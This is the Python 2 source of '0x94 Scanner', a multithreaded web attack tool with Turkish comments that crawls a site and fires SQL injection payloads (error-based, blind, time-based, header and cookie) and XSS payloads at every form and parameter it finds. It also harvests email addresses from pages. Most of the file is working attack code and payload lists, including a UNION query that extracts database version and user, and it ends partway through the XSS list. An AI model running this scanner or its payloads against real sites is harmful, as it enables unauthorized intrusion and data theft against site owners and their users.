#!/usr/bin/python
# -*- coding: utf-8 -*-
# 0x94 Scanner v1.0 [Python 2x]
#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL) INJECTION - LFI -XSS SCANNER"
#Sunucu IP adresi ve kullanilan http bilgisini alir
#Sunucu Allow header listesini alir
#Sitedeki tum linkleri 2 farkli yontemle alir (ayni linkleri tarayip zaman kaybi yapmaz)
#seo ile yada 302 yonlendirmeli linklerin location urllerini otomatik alir (otomatik yonlendirme aktiftir)
#tum linklerde get ve post sql injection dener
#tum linklerde blind get ve post sql injection dener
#tum linklerde time based get ve post sql injection dener
#tum linklerde header injection dener
#sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
#tum linklerde xss dener / bulunan xss satirinda code / noscript var ise belirtir
#tum linklerde lfi dener
#cookie ve proxy destegide vardir.
#ajax ile veri gonderimi olan dosyalari tespit eder
#sitede gecen emailleri otomatik toplar
#calismayan php ve asp kodlarini bulur
#birden fazla request istegini engelleyen siteleri icin request limit ozelligi vardir.
#bulunan sql aciklarinin yollanan verilerin true ve false deger ciktilarini /debug klasorune kaydeder.
#butun sonuclari rapor.txt ye kaydeder
#sadece guvenlik testleri icin kullanin
#Turk sitelerinde tarama yapmaz.
#https://github.com/antichown/0x94scanner / https://twitter.com/0x94
import urllib
import urlparse
import sys
import re
import urllib2
from urllib import urlencode
from urlparse import parse_qsl
import httplib
from string import maketrans
import base64
import socket
import Queue
import threading
from time import sleep
import random
import os
import sre

#cookie ayarlamak istiyorsan buraya gir
sayfacookie="ben=0x940x94"

#sunucuda request limit varsa burayi doldurun
reqbeklemesuresi=1 #saniye cinsinden



queue = Queue.Queue()
yedekq = Queue.Queue()


if not os.path.exists("./debug"):
    os.makedirs("./debug")

from BeautifulSoup import BeautifulSoup




class HTTPAYAR(urllib2.HTTPRedirectHandler):
    
    def http_error_302(self, req, fp, code, msg, headers):
	print "URL Yonlenmesi Algilandi"
        #yaz("URl Yonlenmesi Algilandi \n"+ str(headers),True)
        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)


    http_error_301 = http_error_303 = http_error_307 = http_error_302
    

#Proxy icin bu satiri aktif etmelisiniz
#opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.ProxyHandler({'http': '127.0.0.1:8888'}))
opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
        ("Cookie", sayfacookie)]

urllib2.install_opener(opener)
aynilinkler={}
limitlinkler={}

def yaz(yazi,ekran):
    dosya=open("rapor.txt","a+")
    dosya.write(yazi+"\n")
    dosya.close()
    if ekran==True:
	print yazi
	
    
def Debugyaz(isim,yazi):
    dosya=open(isim,"w")
    dosya.write(yazi+"\n")
    dosya.close()
    
def formyaz(formurl):  

    try:
	toplamveri={}   
	
	html = urllib2.urlopen(formurl).read() 
	soup = BeautifulSoup(html)  
    
	forms=soup.findAll("form")        
	for form in forms:  
	    if form.has_key('action'):  
		if form['action'].find('://') == -1: 
			formurl=formurl + "/" + form['action'].strip('/') 
			print formurl
		else:  
		    print "action: " + formurl
	    else:  
		print "action: " + formurl  	
	    if form.has_key('method') and form['method'].lower() == 'post': 
		    print "[POST] action " +formurl
		    for post_inputselect in form.findAll("select"):
			    print post_inputselect['name']
			    toplamveri[post_inputselect['name']]=""	
		    
		    for post_input in form.findAll("input"):  
			    if post_input.has_key('type'): 
				if post_input['type'].lower() == 'file':
				    yaz(" [#] Dosya Upload Alani Bulundu "+formurl,True)
				if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':  
					if post_input.has_key('id'):  
						print post_input['id']
						if post_input.has_key('value'):
						    toplamveri[post_input['id']]=post_input['value']
						else:
						    toplamveri[post_input['id']]=""
					elif post_input.has_key('name'):
					    print post_input['name']
					    if post_input.has_key('value'):
						toplamveri[post_input['name']]=post_input['value']
					    else:
						toplamveri[post_input['name']]=""
    
						
						
		    
		    postget(formurl, toplamveri,"POST")
		    blindpost(formurl, toplamveri,"POST")
		    posttimebased(formurl, toplamveri,"POST")
			
	    if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
		print "[GET] action " +formurl
		for get_inputselect in form.findAll("select"):
		    if get_inputselect.has_key("name"):
			    print get_inputselect['name']
			    toplamveri[get_inputselect['name']]=""
			    
		
		for get_input in form.findAll("input"):                         
			if get_input.has_key('type'):  
			    if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':  
				    if get_input.has_key('id'):  
					    print get_input['id']
					    if post_input.has_key('value'):
						toplamveri[post_input['id']]=post_input['value']
					    else:
						toplamveri[post_input['id']]=""					    
					    toplamveri[post_input['id']]=""
				    elif get_input.has_key('name'):
					    print get_input['name']
					    if get_input.has_key('value'):
						toplamveri[get_input['name']]=get_input['value']
					    else:
						toplamveri[get_input['name']]=""
		postget(formurl, toplamveri,"GET")
		blindpost(formurl, toplamveri,"GET")
		posttimebased(formurl, toplamveri,"GET")
		
    except urllib2.HTTPError,  e:
	mesaj="hata"

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	#yaz(mesaj)   



def cookieinjection(url,cookie):
    try:
	print "Cookie SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.site.com'"),
	                     ("Cookie", cookie.replace("=","='"))]
	response = opener.open(url)
	sqlkontrol(temizle(response),"[Cookie INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Cookie Injection Http 500 Dondu  / Internal Server Error \n "+cookie.replace("=","='")+"\n" +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           
    
def normalac(url):
    ajaxtespit=["jquery.ajax","$.ajax"]
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
    response = opener.open(url).read().lower()
    
    list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
    if len(list)>0:
	yaz("[#] Email Tespit Edildi "+url+"\n"+str(list),True)
	    
    for ajx in ajaxtespit:
	if ajx in temizle(response):
	    yaz("[#] Ajax Tespit Edildi "+url,True)
    if "<?" in response and "?>" in response and "<?xml" not in response:
	yaz("[#] PHP kod tespit Edildi "+url,True)
    elif "<%" in response and "%>" in response:
	yaz("[#] ASP kod tespit Edildi "+url,True)
    
    
	

def headerinjection(url):
    try:
	print "Header SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.google.com'"),
	                     ("Accept-Language","bekir'")]
	response = opener.open(url)
	headers = response.info()
	yollanacakcookie=headers['Set-Cookie']
	cookieinjection(url, yollanacakcookie)
	sqlkontrol(temizle(response.read()),"[Header INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Header Injection Http 500 Dondu  / Internal Server Error " +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           


def posttimebased(url,params,method):
    
    timesql=[" WAITFOR DELAY '0:0:50';--",
             "'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
             "' and  sleep(50) and  'a'='a",
             "' WAITFOR DELAY '0:0:50';--",
             " IF 1=1 THEN dbms_lock.sleep(50);",
             " ' IF 1=1 THEN dbms_lock.sleep(50);",
             " ' WAITFOR DELAY '0:0:50';--",
             "; SLEEP(50)",
             " SLEEP(50)",
             "' SLEEP(50)--",
             "' SLEEP(50)",
             " pg_sleep(50)",
             " ' pg_sleep(50)",
             " PG_DELAY(50)",
             " ' PG_DELAY(50)",
             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " DBMS_LOCK.SLEEP(50);",
             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]

	
    postgetdict={}
    postgetdict=params.copy()
    
    for timeler in timesql:
	for key,value in params.items():		
	    if key in postgetdict:
		postgetdict[key]=value+timeler
		try:
		    parametresaf = urllib.urlencode(postgetdict)
		    if method=="GET":
			print "Time Based GET SQL testi yapiliyor"
			y11 = temizle(urllib.urlopen(url+"?"+parametresaf,timeout=40).read())
			postgetdict.clear()
			postgetdict=params.copy()
				
		    else:
			print "Time Based POST SQL testi yapiliyor"
			y11 = temizle(urllib2.urlopen(url, parametresaf,timeout=40).read())
			postgetdict.clear()
			postgetdict=params.copy()
		    sqlkontrol(y11,"[#] POST DA SQL ERROR BULUNDU / \nVERISI = "+parametresaf+"\n URL = "+url)
		  

    
		except urllib2.HTTPError,e:
		    print e.reason
		    if(e.code==500):
			yaz("[#] "+method+" Time Based Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
			
		except socket.timeout:
		    yaz("[#] URL= "+url+"\n"+method+" Time BASED SQL BULUNDU \n TIME BASED VERISI\n\n = "+parametresaf,True)
		    
		except urllib2.URLError,  e:
		    if "Time" in e.reason:
			mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
			yaz(mesaj,True)
		except:
		    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       
	    

							
def timebased(url):
    
    timesql=[" WAITFOR DELAY '0:0:50';--",
             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
             "' and  sleep(50) and  'a'='a",
             "' WAITFOR DELAY '0:0:50';--",
             " IF 1=1 THEN dbms_lock.sleep(50);",
             " ' IF 1=1 THEN dbms_lock.sleep(50);",
             " ' WAITFOR DELAY '0:0:50';--",
             "; SLEEP(50)",
             " SLEEP(50)",
             "' SLEEP(50)--",
             "' SLEEP(50)",
             " pg_sleep(50)",
             " ' pg_sleep(50)",
             " PG_DELAY(50)",
             " ' PG_DELAY(50)",
             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
             " DBMS_LOCK.SLEEP(50);",
             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]
    
    for timeler in timesql:
	try:
	    yenitime={}
	    #yenipath=""
	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
		yenitime[key]=value[0]+timeler
		#yenipath+="?"+key+"="+value[0]
	    
	    host=urlparse.urlparse(url).netloc
	    dosya=urlparse.urlparse(url).path
	    #yeniurl="http://"+host+dosya+yenipath
	    
	    
		
	    #query=urlparse.urlparse(url+"&").query
	    #r = re.compile('=(.*?)&')
	    #m = r.search(query)
	    #if m:
		#print m.group(1)
	                      
	    print "Time Based SQL Test Yapiliyor ... "+timeler
	    encoded_args = urllib.urlencode(yenitime)
	    responsex = urllib2.urlopen("http://"+host+dosya+"?"+encoded_args,timeout=40)
	    responsey = temizle(responsex.read())
	    sqlkontrol(responsey,"[#] SQL ERROR BULUNDU / VERISI = "+timeler+"\n URL = "+url)
		
	except urllib2.HTTPError,  e:
	    print e.reason
	    if(e.code==500):
		yaz("[#] Timebased Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
		
	except socket.timeout:
	    yaz("[#] Time BASED SQL BULUNDU \n TIME BASED VERISI = "+"http://"+host+dosya+"?"+timeler,True)
	    
	except urllib2.URLError,  e:
	    if "Time" in e.reason:
		mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
		yaz(mesaj,True)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       


def blindpost(url,params,method):
 
   
    #try:
	#normaldict={}
	#for key,value in params.items():
	    #if value=="":
		#value="0x94"
	    #normaldict[key]=value+"0x94"
	    
	#parametresaf = urllib.urlencode(normaldict)
	#if method=="GET":
	    #print "Normal Blind GET SQL testi yapiliyor"
	    #normalkaynak = temizle(urllib.urlopen(url+"?"+parametresaf).read())	    
	#else:
	    #print "Normal Blind POST SQL testi yapiliyor"
	    #normalkaynak = temizle(urllib2.urlopen(url, parametresaf).read())
	    
    #except urllib2.HTTPError,  e:
	#if(e.code==500):
	    #yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaf,True)
	
    #except urllib2.URLError,  e:
	#mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		##yaz(mesaj)
    #except:
	#mesaj="Bilinmeyen hata olustu\n"    
    
   
    post_string	= [" 'aNd 1=1",
	                    "' anD 1=1",
	                    "' and 1=(select 1)+'",
	                    "'+(SELECT 1)+'",
	                    "'+(SELECT 999999)+'",
	                    "' OR 'bk'='bk",
	                    "bekir' AND 'a'='a",
	                    "' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;",
	                    "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
	                    " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
	                    "' SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",                    
	                    "' or''='",
	                    "bekir 'or''='",
	                    "' and 1=1",
	                    "' and 1=1 'a'='a",
	                    "' and 1=1 'a'='a",
	                    "' aNd 1=2",
	                    "' aNd 1=MID((database()),1,1)>1",
	                    "' aNd 2=MID((@@version,1,1)--+",
	                    "' aNd 3=MID((@@version,1,1)--+",
	                    "' aNd 4=MID((@@version,1,1)--+",
	                    "' aNd 5=MID((@@version,1,1)--+",
	                    "' or 1=1 --",
	                    "a' or 1=1 --",
	                    "' or 1=1 #",
	                    "or 1=1 --",
	                    "') or ('x'='x",
	                    "or username LIKE '%a%",
	                    "' or username LIKE '%a%",
	                    "' HAVING 1=1--",
	                    "' and+1=convert(int,@@version)",
	                    "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
	                    "'a' || 'b' ",
	                    "' SELECT IF(1=1,'true','false')",
	                    "') or ('1'='1--",
	                    "' GROUP BY 99999",
	                    "if(true=false,1,SLEEP(5))--+",
	                    "and+if(true%21=true,1,SLEEP(5))--+",
	                    "and+if(1=2,1,SLEEP(5))--+",
	                    "if(1%21=1,1,SLEEP(5))--+",
	                    "if(true=true,1,SLEEP(5))--+",
	                    "if(2=2,1,SLEEP(5))--+",
	                    "and+true=false--+",
	                    "and+false%21=false--+",
	                    "and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
	                    "union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
	                    "' if(true=false,1,SLEEP(5))--+",
	                    "' and+if(true%21=true,1,SLEEP(5))--+",
	                    "' and+if(1=2,1,SLEEP(5))--+",
	                    "' if(1%21=1,1,SLEEP(5))--+",
	                    "' if(true=true,1,SLEEP(5))--+",
	                    "' if(2=2,1,SLEEP(5))--+",
	                    "' and+true=false--+",
	                    "' and+false%21=false--+",
	                    "' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
	                    "' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"] 	
    
    bitiskarakter=["","--","/*","--+",";",";--","--","#"]
    
    #true_strings=["' OR 'bk'='bk"]
    #false_strings=["' OR 'bk'='bk1111"]
    
    true_strings = ["' or 1=1",
                    "')'a'='a'",
                    "')'a'='a",
                    "'or 'a'='a'",
                    "bekir' AND 'a'='a",
                    "' OR 'bk'='bk",
                    "' and 1=(select 1)+'",
                    "' aNd 1=1",
                    " and 1=1",
                    " ' and 1=1",
                    " and 'a'='a",
                    "' and 'a'='a",
                    "' and 'a'='a",
                    " and 1 like 1",
                    " and 1 like 1/*",
                    " and 1=1--",
                    " group by 1",
                    "'+(SELECT 1)+'",
                    "' and 1=(select 1)+'",
                    "'+aNd+10>1"]    
    
    false_strings =["' or 1=2",
                    "')'a'='b'",
                    "')'a'='b",
                    "'or 'a'='b'",
                    "bekir' AND 'a'='b",
                    "' OR 'bk'='bekir",
                    "' and 1=(select 999999)+'",
                    "' aNd 1=2",
                    " and 1=2",
                    " ' and 1=2",
                    " and 'a'='b",
                    "' and 'a'='b",
                    "' and 'a'='b",
                    " and 1 like 2",
                    " and 1 like 2/*",
                    " and 1=2--",
                    " group by 99999",
                    "'+(SELECT 99999)+'",
                    "' and 1=(select 2)+'",
                    "'+aNd+10>20"]	
    for sonkarakter in bitiskarakter:
	iyy = 0
	while iyy < len(true_strings):
	    
	    
		normaldict={}
		truedict={}
		falsedict={}
		normaldict=params.copy()	
		truedict=params.copy()
		falsedict=params.copy()
	    
		
		
		for key,value in params.items():
		    normalkaynak=""
		    if key in normaldict:
			if value=="":
			    value="0x94"
			normaldict[key]=value
			print "POST Normal Deneniyor..."
			parametresafn = urllib.urlencode(normaldict)
			if method=="GET":
			    print "Blind Normal GET SQL testi yapiliyor"
			    normalkaynak = temizle(urllib.urlopen(url+"?"+parametresafn).read())
			    
			    normaldict.clear()
			    normaldict=params.copy()				    
			else:
			    print "Blind Normal POST SQL testi yapiliyor"
			    normalkaynak = temizle(urllib2.urlopen(url, parametresafn).read())
			    normaldict.clear()
			    normaldict=params.copy()
			
		#-----------------------------------------------------------------------------------		
		    if key in truedict:
			print "POST True Deneniyor: "+true_strings[iyy]+sonkarakter
			if value=="":
			    value="0x94"
			truedict[key]=value+true_strings[iyy]+sonkarakter
			try:
			    parametresaft = urllib.urlencode(truedict)
			    if method=="GET":
				print "Blind GET SQL testi yapiliyor"
				truekaynak = temizle(urllib.urlopen(url+"?"+parametresaft).read())
				truedict.clear()
				truedict=params.copy()			    
			    else:
				print "Blind POST SQL testi yapiliyor"
				truekaynak = temizle(urllib2.urlopen(url, parametresaft).read())
				truedict.clear()
				truedict=params.copy()
			    sqlkontrol(truekaynak,method+" "+url)
    
				
			except urllib2.HTTPError,  e:
			    if(e.code==500):
				yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaft,True)
			    
			except urllib2.URLError,  e:
			    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
				    #yaz(mesaj)
			except:
			    mesaj="Bilinmeyen hata olustu\n"  
			    
			    
			if key in falsedict:

			    print "POST False Deneniyor: "+false_strings[iyy]+sonkarakter
			    if value=="":
				value="0x94"
			    falsedict[key]=value+false_strings[iyy]+sonkarakter	
			    try:
				parametresaff = urllib.urlencode(falsedict)
				if method=="GET":
				    print "Blind GET SQL testi yapiliyor"
				    falsekaynak = temizle(urllib.urlopen(url+"?"+parametresaff).read())
				    
				    falsedict.clear()
				    falsedict=params.copy()				    
				else:
				    print "Blind POST SQL testi yapiliyor"
				    falsekaynak = temizle(urllib2.urlopen(url, parametresaff).read())
				    falsedict.clear()
				    falsedict=params.copy()	
				    
				sqlkontrol(falsekaynak,method+" SQL INJECTION "+url+"\n Yollanan Veri="+parametresaff)
	
	    
				
			    except urllib2.HTTPError,  e:
				if(e.code==500):
				    yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaff,True)
				
			    except urllib2.URLError,  e:
				mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
					#yaz(mesaj)
			    except:
				mesaj="Bilinmeyen hata olustu\n"  		    
			    #if (comparePages(truekaynak,normalkaynak,url," BLIND ") > comparePages(truekaynak,falsekaynak,url," BLIND ")):
    
			    if normalkaynak==falsekaynak:
				if truekaynak!=falsekaynak:
				    
				    comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
		

				    #comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
				    debug=1
			    #comparePages(y1kaynak,y2kaynak,url,"[#] BLind "+method+" Sayfada Degisiklik oldu  !!![+]"+url+"\nYollanan Veri ="+false_strings[iyy]+sonkarakter+"\n")	
			    iyy=iyy+1 
			    
	
		

def postget(url, params, method):

    try:
	
	postgetdict={}
	postgetdict=params.copy()
	
	for key,value in params.items():
	    if key in postgetdict:
		
		postgetdict[key]=value+"'"
		parametre = urllib.urlencode(postgetdict)
		if method=="GET":
		    print "GET SQL testi yapiliyor"
		    f = urllib.urlopen(url+"?"+parametre)
		else:
		    print "POST SQL testi yapiliyor"
		    f = urllib2.urlopen(url, parametre)
		sqlkontrol (temizle(f.read()),"[#] SQL ERROR BULUNDU \n LINK = "+url+"\n Veri= "+parametre)
		postgetdict.clear()
		postgetdict=params.copy()		
		

	
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
	
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)       
    


def comparePages(page1,page2,deurl,info):

    #bakalim1=set(list(page1.split("\n")))
    #bakalim2=set(list(page2.split("\n")))
    
    #toplamsatir=""
    
    #varrr=False
    #for satir1 in bakalim1:
	#for satir2 in bakalim2:
	    #if satir1!=satir2:
		#varrr=True
		##mesaj1="Link %s  \n" % (deurl)
		#mesaj2=info+"\n"
		##mesaj3="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar var\n"
		#toplamsatir+=satir1+"\n"
		
    #if varrr==True:
	#print "Gerekli bilgi log dosyasina yazildi\n"
	#yaz(mesaj2+"\n",True)
	#varrr=False
	#toplamsatir=""
	
		
    tmp1 = re.split("<[^>]+>",page1)
    tmp2 = re.split("<[^>]+>",page2) 
    count1 = 0;
    count2 = 0;
    
    
    
    for i in range(len(tmp1)):
	if page2.find(tmp1[i]) < 0:
	    
	    mesaj="Link %s  \n" % (deurl)
	    mesaj+=info+"\n"
	    mesaj+="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar = %s \n" % (tmp1[i])
	    yaz(mesaj+"\n",True)
	    count1+=1
	    ran=random.randrange(1, 100000, 2)
	    Debugyaz("debug/"+str(ran)+"false.html",mesaj+"\n\n\n\n\n"+page2)
	    Debugyaz("debug/"+str(ran)+"true.html",mesaj+"\n\n\n\n\n"+page1)
    
    
    
    for i in range(len(tmp2)):
	if page1.find(tmp2[i]) < 0:
	    count2+=1
	    ##print max(count1, count2)
    return max(count1, count2)


def sqlkontrol(response,urlnormal):
    print "SQL hata mesaji kontrol ediliyor"
    if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-SQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
	mesaj= "[#] %s MS-Access error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft JET Database Engine",response,re.DOTALL):
	mesaj= "[#] %s MS Jet database engine error" % urlnormal
	yaz(mesaj,True)
    if re.search("ADODB.Command.*error",response,re.DOTALL):
	mesaj= "[#] %s ADODB Error" % urlnormal
	yaz(mesaj,True)
    if re.search("Microsoft VBScript runtime",response,re.DOTALL):
	mesaj= "[#] %s VBScript runtime error" % urlnormal
	yaz(mesaj,True)
    if re.search("Type mismatch",response,re.DOTALL):
	mesaj= "[#] %s VBScript / ASP error" % urlnormal
	yaz(mesaj,True)
    if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
	mesaj= "[#] %s ASP .NET OLEDB Exception" % urlnormal
	yaz(mesaj,True)
    if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat JDBC error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)	
    if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
	mesaj= "[#] %s MySQL Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	mesaj= "[#] %s Oracle DB Server error" % urlnormal
	yaz(mesaj,True)
    if re.search("DorisDuke error",response,re.DOTALL):
	mesaj= "[#] %s DorisDuke error\n" % urlnormal
	yaz(mesaj,True)
    if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
	mesaj= "[#] %s Java Servlet error" % urlnormal
	yaz(mesaj,True)
    if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
	mesaj= "[#] %s Apache Tomcat error" % urlnormal
	yaz(mesaj,True)
    if re.search("Warning.*failed to open stream",response,re.DOTALL):
	mesaj= "[#] %s PHP error" % urlnormal
	yaz(mesaj,True)
    if re.search("Fatal Error.*on line",response,re.DOTALL):
	mesaj= "[#] %s PHP error" % urlnormal
	yaz(mesaj,True)
    if re.search("Fatal Error.*at line",response,re.DOTALL):
	mesaj= "[#] %s PHP error" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Warning: mysql_num_rows():",response,re.DOTALL):
	mesaj= "[#] %s MYSQL ERROR " % urlnormal
	yaz(mesaj,True)


def xsstest(xsstesturl):

    try:
	print "XSS Test ediliyor ... "
	urlac = urllib2.urlopen(xsstesturl+"0x000123")
	response = urlac.read()
	if "0x000123" in response:
	    yaz("XSS Test BULUNDU : " + xsstesturl+" 0x000123",True)
	    xsstara(xsstesturl)
	else:
	    xsstara(xsstesturl)
		  
    except urllib2.HTTPError,e:
	if(e.code==500):
	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +xsstesturl,True)
   
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,xsstesturl)
	   #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"           
	

def xsstara(xssurl):
    
    xsspayload=["\"><script>alert(0x000123)</script>",
                "\"><sCriPt>alert(0x000123)</sCriPt>",
                "\"; alert(0x000123)",
                "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
                "\"><img Src=0x94 onerror=alert(0x000123)>",
                "\"><BODY ONLOAD=alert(0x000123)>",
                "\"><IMG SRC=\"javascript:alert(0x000123);\">",
                "\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x000123);\">",
                "'%2Balert(0x000123)%2B'",
                "\"><0x000123>",
